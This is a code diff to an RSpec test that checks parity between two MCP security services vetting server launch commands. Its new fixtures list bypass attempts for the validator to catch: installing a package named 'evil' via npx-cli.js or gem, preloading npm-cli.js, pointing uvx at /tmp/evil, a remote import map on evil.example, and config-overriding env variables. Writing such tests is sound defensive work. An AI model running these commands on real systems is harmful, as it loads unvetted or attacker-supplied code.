@@ -136,13 +136,20 @@ RSpec.describe "Mcp::SecurityService parity with the worker's McpSecurityService
       package_pin_violation_for_argv
       package_launcher_for
       package_launcher_pin_violation
-      unknown_launcher_option_message
+      raise_unknown_launcher_option!
+      raise_unless_local_script!
+      raise_unless_bin_name!
+      raise_unpinned_package!
       uv_pin_violation
       pipx_pin_violation
       bun_x_pin_violation
       deno_specifier_pin_violation
       pinned_package_spec?
       unpinned_package_message
+      raise_on_package_manager_entry!
+      package_manager_entry?
+      package_manager_entry_candidates
+      raise_on_launcher_global_option!
     ].freeze
 
     # Finds `def <method_name> ... end` by name and returns its
@@ -238,6 +245,10 @@ RSpec.describe "Mcp::SecurityService parity with the worker's McpSecurityService
     JSR_PINNED_PACKAGE_PATTERN
     DENO_NPM_PINNED_SPECIFIER_PATTERN
     DENO_JSR_PINNED_SPECIFIER_PATTERN
+    PACKAGE_MANAGER_ENTRY_BASENAMES
+    PACKAGE_MANAGER_ENTRY_PATH_PATTERN
+    LAUNCHER_PYTHON_VERSION_PATTERN
+    NPX_BIN_NAME_PATTERN
   ].freeze
 
   # IMP-abda86fb39be — kept server-side ONLY so Mcp::WorkerStdioClient can
@@ -524,7 +535,23 @@ RSpec.describe "Mcp::SecurityService parity with the worker's McpSecurityService
       {:name=>"pin: pipx run unpinned", :command=>"pipx", :args=>["run", "pkg"], :env=>{}, :capabilities=>{"allow_extended_commands"=>true}},
       {:name=>"pin: pipx run --pip-args", :command=>"pipx", :args=>["run", "--pip-args=--index-url=x", "pkg==1.0.0"], :env=>{}, :capabilities=>{"allow_extended_commands"=>true}},
       {:name=>"pin: deno npm: unpinned", :command=>"deno", :args=>["run", "-A", "npm:pkg"], :env=>{}, :capabilities=>{}},
-      {:name=>"pin: deno jsr: pinned", :command=>"deno", :args=>["run", "jsr:@scope/pkg@1.2.3"], :env=>{}, :capabilities=>{}}
+{:name=>"pin: deno jsr: pinned", :command=>"deno", :args=>["run", "jsr:@scope/pkg@1.2.3"], :env=>{}, :capabilities=>{}},
+# Round 1 additions.
+{:name=>"pm: node npx-cli.js", :command=>"node", :args=>["/usr/local/lib/node_modules/npm/bin/npx-cli.js", "-y", "evil"], :env=>{}, :capabilities=>{}},
+{:name=>"pm: ruby gem", :command=>"ruby", :args=>["/usr/local/bin/gem", "install", "evil"], :env=>{}, :capabilities=>{}},
+{:name=>"pm: node -r npm-cli.js", :command=>"node", :args=>["-r", "/usr/lib/node_modules/npm/bin/npm-cli.js", "./s.js"], :env=>{}, :capabilities=>{}},
+{:name=>"pm: node real script", :command=>"node", :args=>["./dist/index.js"], :env=>{}, :capabilities=>{}},
+{:name=>"global: uv -q tool run", :command=>"uv", :args=>["-q", "tool", "run", "pkg==1.0.0"], :env=>{}, :capabilities=>{"allow_extended_commands"=>true}},
+{:name=>"global: pipx --quiet run", :command=>"pipx", :args=>["--quiet", "run", "pkg==1.0.0"], :env=>{}, :capabilities=>{"allow_extended_commands"=>true}},
+{:name=>"py: uvx --python path", :command=>"uvx", :args=>["--python", "/tmp/evil", "pkg==1.0.0"], :env=>{}, :capabilities=>{"allow_extended_commands"=>true}},
+{:name=>"py: uvx --python version", :command=>"uvx", :args=>["--python", "3.12", "pkg==1.0.0"], :env=>{}, :capabilities=>{"allow_extended_commands"=>true}},
+{:name=>"uv run bare script", :command=>"uv", :args=>["run", "server.py"], :env=>{}, :capabilities=>{"allow_extended_commands"=>true}},
+{:name=>"uv run ./script", :command=>"uv", :args=>["run", "./server.py"], :env=>{}, :capabilities=>{"allow_extended_commands"=>true}},
+{:name=>"npx selector then path", :command=>"npx", :args=>["-p", "pkg@1.2.3", "./x"], :env=>{}, :capabilities=>{}},
+{:name=>"deno --preload= unpinned", :command=>"deno", :args=>["run", "--preload=npm:pkg", "./s.ts"], :env=>{}, :capabilities=>{}},
+{:name=>"deno --import-map= URL", :command=>"deno", :args=>["run", "--import-map=https://evil.example/m.json", "./s.ts"], :env=>{}, :capabilities=>{}},
+{:name=>"env: UV_CONFIG_FILE forbidden", :command=>"uvx", :args=>["pkg==1.0.0"], :env=>{"UV_CONFIG_FILE"=>"/tmp/x"}, :capabilities=>{"allow_extended_commands"=>true}},
+{:name=>"env: XDG_CONFIG_HOME forbidden", :command=>"npx", :args=>["-y", "pkg@1.2.3"], :env=>{"XDG_CONFIG_HOME"=>"/tmp/x"}, :capabilities=>{}}
     ].freeze
 
   def self.verdict_for(klass, fixture)
